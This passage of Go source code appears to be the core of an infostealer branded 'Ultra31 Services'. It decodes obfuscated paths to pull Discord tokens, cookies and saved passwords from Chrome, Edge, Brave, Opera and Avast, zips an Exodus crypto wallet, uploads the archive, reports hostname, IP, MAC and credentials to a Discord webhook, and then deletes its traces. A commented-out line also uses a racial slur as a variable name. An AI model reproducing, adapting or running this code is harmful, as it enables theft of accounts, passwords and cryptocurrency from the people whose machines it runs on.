	Kayttaja := os.Getenv("USERPROFILE")

	/*
		a_dp := os.Getenv("APPDATA")
		MuskeliLogsPath := "Muskeli_Logs"

		FULLPATH := a_dp + "\\" + MuskeliLogsPath

		if err := os.Mkdir(a_dp+"\\"+MuskeliLogsPath, 0755); err != nil && !os.IsExist(err) {
			return
		}

		if errBrowser := os.Mkdir(FULLPATH, 0755); errBrowser != nil && !os.IsExist(errBrowser) {
			return
		}
	*/

	//Minecraft_Token(Kayttaja+"\\.lunarclient\\settings\\game\\accounts.json", FULLPATH+"\\LunarClient_accounts.json") //Grab Lunar Client login file
	//Minecraft_Token(a_dp+"\\Roaming\\.feather\\accounts.json", FULLPATH+"\\FeatherClient_accounts.json")              //Grab Feather Client login file

	//NappaaCVC("C:\\Users\\Aarne\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data", os.Getenv("USERPROFILE")+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "GoogleTest")
	//CreditCards("C:\\Users\\Aarne\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data", os.Getenv("USERPROFILE")+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "NoobGoogle")

	D1sc0rdPath := dec("XF~~~~~~~~~~xBcHBEY~~~~~~~~~~~~XRhXFxSb2~~~~~~~~~~~~~FtaW5nXFxka~~~~~~~~~~XNjb3JkXF~~~~xMb2Nhb~~~~~~~~~~~~~CBTdG9yYW~~~~~~~~~dlXFxsZXZlb~~~~~~~~~~~~GRi")

	//"C:\Users\Aarne\\AppData\\Roaming\\discord\\Local State"

	//XFxBcHBEYXRhXFxSb2FtaW5nXFxkaXNjb3JkXFxMb2NhbCBTdGF0ZQ==

	D1sc0rdState := dec("XFx~~~~~~~~~~~~~~BcHBEYXRh~~~~~~~~~~~~XFxSb2FtaW5nX~~~~~~~~~~~~~~~FxkaXNjb3JkXF~~~~~~~~~~~~~~~xMb2NhbCB~~~~~~~~TdGF0ZQ==")

	Discord := []Discordit{
		{Kayttaja + D1sc0rdPath, Kayttaja + D1sc0rdState},
	}

	for _, d := range Discord {
		D1sc0rdT0ken1(d.path, d.state)
	}

	SQL_LITE_DECODED := dec("U0V~~~~~~~~~~~~~MRUNUIGhvc3Rfa2V~~~~~~~~~5LCBuYW1lLCB~~~~~~~~~~~~lbmNyeXB0ZWR~~~~~~~~~~~~fdmFsdWUsIGV~~~~~~~~~~~4cGlyZXNfdXRjIEZ~~~~~~~~~~~~~~~~ST00gY29va~~~~~~~~~~~2llcw==")

	SelainX := []Selaimet{
		{Kayttaja + dec("XFxB~~~~~~~cHBEY~~~~~~~~~XRhXFxMb2N~~~~~~~~~~~~~hbFxcR29~~~~~~~~~~~~~~vZ2xlXFxD~~~~~~~~aHJvbWVc~~~~~~~~~~XFVzZXIg~~~~~~~~~~~RGF0YVx~~~~~~~~~~cRGVmYXVsd~~~~~~~~~~~~FxcTmV0d29ya1~~~~~~~~~~~xcQ29va2llcw=="), Kayttaja + dec("XF~~~~~~~~~~~~~xBcHBE~~~~~~~~~YXRhXFxMb2~~~~~~~~~~NhbFxcR29vZ~~~~~~~~~~~~~~2xlXFxDaHJvbW~~~~~~~~~~~~VcXFVz~~~~~~~~~ZXIgRGF0YV~~~~~~~~~~~xcTG9jYWw~~~~~~~~~~~gU3R~~~~~~~~hdGU=~~~~~~~~"), "Chrome"},
		{Kayttaja + dec("XF~~~~~~~~~~~xBcHBE~~~~~~~~~~~~~YXRhXFxMb2NhbFx~~~~~~~~cTWljcm9zb2Z0XF~~~~~~~~xFZGdlXFxVc2Vy~~~~~~~~~~~IERhdGFcXERlZmF1bH~~~~~~~~~~RcXE5ldHdvcmtc~~~~~~~~~~~~XENvb2tpZXM="), Kayttaja + dec("XFx~~~~~~~~~~~~~~BcHBEYXRhXFxMb2Nh~~~~~~~~~~~~~~bFxcTWljcm9zb~~~~~~~~~~~2Z0XFxFZGdlXFxVc2~~~~~~~~~~~VyIERhdGF~~~~~~~~~~~cXExvY2F~~~~~~~~~sIFN0YXRl"), "Edge"},
		{Kayttaja + dec("XF~~~~~~~~xBcHBE~~~~~~~~~~~YXRhXFxMb~~~~~~~~~~~~2NhbFxcQnJ~~~~~~~~~~~~hdmVTb2Z0d2FyZVxcQnJ~~~~~~~~~~~~~~hdmUtQnJvd3Nlc~~~~~~~~~lxcVXNlciBEYXRh~~~~~~~~~XFxEZWZhdWx0~~~~~~~~~XFxOZXR3b3Jr~~~~~~~~~~~XFxDb29~~~~~~raWVz"), Kayttaja + dec("X~~~~~~~~~FxBcH~~~~~~~~~BEYXRhXF~~~~~~~~~~xMb2N~~~~~~~hbFxcQ~~~~~~~~~nJhdmVTb2~~~~~~~~~~~~~Z0d2FyZ~~~~~~~~~~VxcQnJhdmUtQnJv~~~~~~d3NlclxcVXN~~~~~~~~~~lciBEYXRhXFxMb2~~~~~~~NhbCBTdGF0ZQ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=="), "Brave"},
		{Kayttaja + dec("XFx~~~~~~~~~~BcHBEYX~~~~~~~~~~~RhXFxSb2FtaW5n~~~~~~~XFxPcGVyYSBTb2Z0d~~~~~~~~~~~~2FyZVxcT3BlcmEgR1~~~~~~~~~ggU3RhYmxlXFxOZX~~~~~~~~~R3b3JrXFxD~~~~~~~~~b29raWVz"), Kayttaja + dec("X~~~~~~~~~~~~FxBcHBEY~~~~~~~XRhXFxS~~~~~~~~~~~~b2FtaW5nXFxP~~~~~~~~~~cGVyYS~~~~~~~~~~BTb2Z0d2FyZVx~~~~~~~~~~~~cT3BlcmEgR1g~~~~~~~~gU3RhYmxl~~~~~~~~~~~~XFxMb2NhbCBT~~~~~~~~~dGF0ZQ==~~~~~~~~~~~~~"), "Opera"},
		{Kayttaja + dec("XFx~~~~~~~~~~~~~BcHBEYXR~~~~~~~~~~~~hXFxMb2Nhb~~~~~~~~~~~~FxcWWFuZGV4XF~~~~~~~~xZYW5kZXhCcm93c2~~~~~~~~~VyXFxVc2VyIERhdGFcX~~~~~~~~~ERlZmF1bHRcX~~~~~~~~~E5ldHdvcmtc~~~~~~~~XENvb2tpZXM="), Kayttaja + dec("XFxB~~~~~~~~~~~~cHBEYXR~~~~~~~~hXFxMb2NhbFxcWWFu~~~~~~~~~~~~~~ZGV4XFxZYW5kZ~~~~~~~~~~XhCcm93c2VyXFxVc~~~~~~~~~~~2VyIERhdGFcXExv~~~~~~~~~~Y2FsIFN~~~~~~~~~~0YXRl"), "Yandex"},
		{Kayttaja + dec("XFx~~~~~~~~~~~~~BcHBEYXRhXFxM~~~~~~~~~b2NhbFxcQX~~~~~~~~~Zhc3QgU29mdHd~~~~~~~~~~~~~~~hcmVcXEJyb3dz~~~~~~~~~ZXJcXFVzZXIgRG~~~~~~~~~~~~F0YVxcRGVm~~~~~~~~~YXVsdFxcTmV0d29y~~~~~~~~~~a1xcQ29va2llcw==~~~~~~~"), Kayttaja + dec("XF~~~~~~~~xBcHBEYXRh~~~~~~~~~~~XFxMb2NhbFxcQXZhc3~~~~~~~~~~~~~~~QgU29mdHdhcm~~~~~~~~~~~~~~~~~VcXEJyb3dzZXJcXFVzZX~~~~~~~~~~IgRGF0YVxcTG9jYWw~~~~~~~~~~gU3R~~~~~~~~~~~~hdGU="), "Avast"},
	}

	for _, s := range SelainX {
		KeksiPolku := s.Keksi
		SuojausAvain := s.Avain
		SelaimenNimi := s.Selain
		KeksiVaras(KeksiPolku, SuojausAvain, SelaimenNimi, SQL_LITE_DECODED)
	}

	Salis_SQL_DECODE := dec("U~~~~~~~~~~~0VMRU~~~~~~~~~~~~~~~~NUIG9yaWdpbl9~~~~~~~~~~~~~~~~~~1cmwsIHVzZXJuYW1lX~~~~~~~~~~~~~~~3ZhbHVlLCBwYX~~~~~~~~~~~~~Nzd29yZF92~~~~~~~~~~~~YWx1ZSB~~~~~~~~~~GUk9NIGx~~~~~~~vZ2lucw==~~~~~~~~~~~~~~")

	//\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
	//XFxBcHBEYXRhXFxMb2NhbFxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9naW4gRGF0YQ==

	//XFxBcHBEYXRhXFxMb2NhbFxcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bHRcXExvZ2luIERhdGE=

	SelainS := []Selaime{
		{os.Getenv("USERPROFILE") + dec("XF~~~~~~~xBcHBEYX~~~~~~~~~~~~~RhXFxMb2~~~~~~~~~~~~~NhbFxcR29vZ2xlXFxDaHJ~~~~~~~~~~vbWVcXFV~~~~~~zZXIgRGF0YVx~~~~~~~~~cRGVmYXV~~~~~~~~~~~sdFxcTG9n~~~~~~~~~aW4gR~~~~~~~GF0YQ=="), os.Getenv("USERPROFILE") + dec("XFx~~~~~~~~BcHBEYXRhXFx~~~~~~~~~Mb2Nhb~~~~~~~~FxcR29vZ2xlXFxD~~~~~~~~~~aHJvbWVcXF~~~~~~~~~VzZXIgRGF0YVx~~~~~~~~~cTG9jYW~~~~~~~~~~~wgU3R~~~~~~~~~~~hdGU="), "Chrome"},
		{os.Getenv("USERPROFILE") + dec("XFxBc~~~~~~~~~HBEYXRhXFxMb2NhbFxcTWljcm9zb2Z~~~~~~~~~~0XFxFZGdlXFxVc2VyI~~~~~~~~ERhdGFcXERlZmF1bHRcXExvZ2luIERhdGE="), os.Getenv("USERPROFILE") + dec("XF~~~~~~~~~~~xBcHBE~~~~~~~~~~~~YXRhXFx~~~~~~~~~~~Mb2NhbFx~~~~~~~~cTWljcm9zb~~~~~~2Z0XFxFZGdlXFx~~~~~~~~~Vc2VyIERhd~~~~~GFcXExvY2FsIF~~~~~~~~~N0YXRl"), "Edge"},
		{os.Getenv("USERPROFILE") + dec("XFxBcH~~~~~~~~BEYXRhXFxMb2N~~~~~~~~~~~hbFxcQnJhdmVTb2Z0d2FyZVxcQnJ~~~~~~~~~~~~~hdmUtQnJvd3NlclxcVX~~~~~~~~~~NlciBEYXRhXF~~~~~~~~~~~~~~~~xEZWZhdWx0XFxMb2~~~~~~~~~~~dpbiBEYXRh"), os.Getenv("USERPROFILE") + dec("XF~~~~~~~xBcHBEYXRhXFx~~~~~~~~~~~~Mb2NhbFx~~~~~~~~~~~cQnJhdmVT~~~~~~~~~~~~b2Z0d2FyZVx~~~~~~~~~cQnJhdmUtQnJvd~~~~~~~~~3NlclxcVXNl~~~~~~ciBEYXRhXFxMb2Nhb~~~~~~~~~~CBTdGF0Z~~~~~~~~~~Q=="), "Brave"},
		{os.Getenv("USERPROFILE") + dec("XFx~~~~~~~~BcHBEYXRh~~~~~~~~~~XFxSb2Fta~~~~~~~~~~~~~~~~W5nXFxPcGVy~~~~~~~~~~~~YSBTb2Z0d2F~~~~~~~~~~~yZVxcT3BlcmE~~~~~~~~~~~~gR1ggU3RhYm~~~~~~~~~xlXFxMb2~~~~~~dpbiBE~~~~~~~~~~YXRh"), os.Getenv("USERPROFILE") + dec("XF~~~~~~xBcHBEYXRh~~~~~~~~~XFxSb2Ft~~~~~~~~aW5nXFxPcGVyYSBTb2Z0~~~~~~~~~~~~d2FyZVxcT3B~~~~~lcmEgR1~~~~~~~~~~~~ggU3RhYmxlXF~~~~~~~~~~xMb2NhbCBT~~~~~~~~~dGF0ZQ=="), "Opera"},
		{os.Getenv("USERPROFILE") + dec("XFx~~~~~~~~~~~BcH~~~~~~~~~~~~BEYXRhX~~~~~~~~~~~~FxMb2NhbFxc~~~~~~~~~QXZhc3QgU~~~~~~~~~~~29mdHdhcmVcXEJ~~~~~~~~~~~~yb3dzZXJcXFV~~~~~~~~~zZXIgRGF0YV~~~~~~~~~~~xcRGVmYXVsdFx~~~~~~~~~~~~cTG9naW4g~~~~~~~~~~~~RGF~~~~~~~~~~~0YQ~~~~~~~~~~=="), os.Getenv("USERPROFILE") + dec("XF~~~~~~~~~~~~xBcHBE~~~~~~YXRhXFx~~~~~~~~~~~~~Mb2NhbFx~~~~~~~~~~cQXZhc~~~~~~~~~3QgU29mdHdhcmV~~~~~~cXEJyb3d~~~~~~~zZXJcXFVzZXI~~~~~~~~~gRGF0YVx~~~~~~cTG9jYWwg~~~~~~~~U3Rhd~~~~~~~~~~GU="), "Avast"},
	}

	/*
			SelainS := []Selaime{
			{os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "Chrome"},
			{os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", "Edge"},
			{os.Getenv("USERPROFILE") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", os.Getenv("USERPROFILE") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave"},
			{os.Getenv("USERPROFILE") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data", os.Getenv("USERPROFILE") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State", "Opera"},
			{os.Getenv("USERPROFILE") + "\\AppData\\Local\\Avast Software\\Browser\\User Data\\Default\\Login Data", os.Getenv("USERPROFILE") + "\\AppData\\Local\\Avast Software\\Browser\\User Data\\Local State", "Avast"},
		}
	*/

	for _, x := range SelainS {
		SalisPaikka := x.Salis
		SuojausAvaaja := x.Avaaja
		SelausNimi := x.Selaaja
		NappaaSalikset(SalisPaikka, SuojausAvaaja, SelausNimi, Salis_SQL_DECODE)
	}

	//"C:\Users\Aarne\AppData\Local\Avast Software\Browser\User Data\Local State"
	//"C:\Users\Aarne\AppData\Local\Avast Software\Browser\User Data\Default\Login Data"
	//"C:\Users\Aarne\AppData\Local\Avast Software\Browser\User Data\Default\Network\Cookies"
	exoottinen := WorkDir + "\\Exodus\\exodus.wallet"

	teePakattuKansio(exoottinen, "Ex0dusWaIIet.zip")

	liikutafilu("ExodusWallet.zip", WorkDir)
	liikutafilu("running_apps.txt", WorkDir)
	//nigger := os.Getenv("LOCALAPPDATA")
	////////fmt.println(nigger)
	//sendFileToWebhook(w_u_r, nigger+"\\Growtopia\\save.dat")

	teePakattuKansio(WorkDir, os.Getenv("APPDATA")+"\\"+m_m+".zip")

	// Read the file content
	file, errP4Y10AD := os.ReadFile(os.Getenv("APPDATA") + "\\" + m_m + ".zip")
	if errP4Y10AD != nil {
		fmt.Println("Error reading file:", errP4Y10AD)
		return
	}

	// Create a buffer for multipart form data
	var buffer bytes.Buffer
	writer := multipart.NewWriter(&buffer)

	// Add the file to the multipart form data
	part, err := writer.CreateFormFile("file", os.Getenv("APPDATA")+"\\"+m_m+".zip")
	if err != nil {

		return
	}
	_, err = io.Copy(part, bytes.NewReader(file))
	if err != nil {
		//////fmt.println("Error copying file to form:", err)
		return
	}

	writer.Close()

	// Upload the file and get the response
	Rsp_UP, err := UppaaFilu(os.Getenv("APPDATA") + "\\" + m_m + ".zip")
	if err != nil {
		//////fmt.println("Error uploading file:", err)
		return
	}

	macAddr, err := iiasdfdsaf32324123()
	//////fmt.println(macAddr)

	/*

		iiasdfdsaf, iiasdfdsaf_ERROR := hiudfuihadsfihdsaiuhf()

		if iiasdfdsaf_ERROR != nil {
			//////fmt.println(iiasdfdsaf_ERROR)
		}

		gpu, GPU_ERROR := getGPUInfo()

		if GPU_ERROR != nil {
			//////fmt.println(GPU_ERROR)
		}

		cpu, CPU_ERROR := iiasdfdsaf32324()

		if CPU_ERROR != nil {
			//////fmt.println(CPU_ERROR)
		}
	*/

	message := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "----Ultra31 Services----",
				"description": "",
				"thumbnail": map[string]interface{}{
					"url": dec("aHR~~~~~~~~~~~~~~~~~~~~~~~~~~~~0cHM6Ly9jZG4uZGlzY29yZGF~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~wcC5jb20vYXR0YWNobWVu~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~dHMvMTI5NTcyNzEzMTYzNjI2OTEyMS8xMzAxMjM3ODgxNDU~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~2ODIwMjc0L2ltZy5wbmc/ZXg9NjcyM2JmYjYmaXM9NjcyMjZlM~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~zYmaG09Nzk1MTU5ZTAyOTRiO~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~TJlNmJiNmM4OTdiZGUyNW~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~YyMDQzZWM0NjY3NDk5ZWUwNDY2YT~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~NjNzgyOTNjNmQyM2ZlYiY="),
				},
				"fields": []map[string]interface{}{
					{"name": ":desktop:HOSTNAME", "value": fmt.Sprint(h_n), "inline": true},
					{"name": ":toolbox:IP ADDRESS", "value": fmt.Sprint(e_1p), "inline": true},
					{"name": ":fax:MAC ADDRESS", "value": fmt.Sprint(macAddr), "inline": true},
					{"name": ":package:D0wnload l1nk", "value": "[ZIP Download](" + Rsp_UP.URL + ")", "inline": false},
					{"name": ":cookie:C00kie", "value": fmt.Sprint(k_c), "inline": true},
					{"name": ":key:Passwords", "value": fmt.Sprint(p_c), "inline": true},
				},
			},
		},
	}

	jsonP4Y10AD, err := json.Marshal(message)
	if err != nil {
		return
	}
	resp, errHook := http.Post(We3__H00K, "application/json", bytes.NewBuffer(jsonP4Y10AD))

	if errHook != nil {
		//////fmt.println("Error sending POST request:", err)
		return
	}
	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode == http.StatusOK {

	} else {
		errror, StupidError := io.ReadAll(resp.Body)
		if StupidError != nil {
			//////fmt.println(StupidError)
		}

		if errror == nil {
			//////fmt.println(errror)
		}

	}

	CleanUpErr := os.RemoveAll(WorkDir)

	if CleanUpErr != nil {
		fmt.Println(CleanUpErr)
	} else {
		fmt.Println("Done.")
	}

	UpTempDirErr := os.Remove(os.Getenv("APPDATA") + "\\" + m_m + ".zip")

	if UpTempDirErr != nil {
		fmt.Println(UpTempDirErr)
	}

	os.Remove(os.Getenv("APPDATA") + "\\CardConfig.dat")
	os.Remove(os.Getenv("APPDATA") + "\\Config.dat")
	os.Remove(os.Getenv("APPDATA") + "\\tempfile.dat")
	os.Remove(os.Getenv("APPDATA") + "\\UserSettings.dat")
	os.Remove("output.txt")

}
